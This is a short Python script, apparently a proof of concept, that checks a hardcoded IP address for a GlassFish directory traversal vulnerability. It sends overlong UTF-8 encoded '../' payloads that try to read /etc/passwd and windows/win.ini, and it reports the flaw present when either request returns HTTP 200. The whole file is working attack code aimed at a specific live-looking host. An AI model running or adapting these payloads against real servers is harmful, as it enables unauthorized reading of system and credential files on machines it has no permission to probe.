import requests

url = 'http://39.104.57.34:8080/'


def isExistsGlassfishVul(url):
    linux_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd'
    win_payload = '/theme/META-INF/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/windows/win.ini'
    linux_data = requests.get(url + linux_payload)
    win_data = requests.get(url + win_payload)
    if linux_data.status_code == 200 or win_data.status_code == 200:
        print('glassfish vul exists')
    else:
        print('glassfish vul not exists')


isExistsGlassfishVul(url)
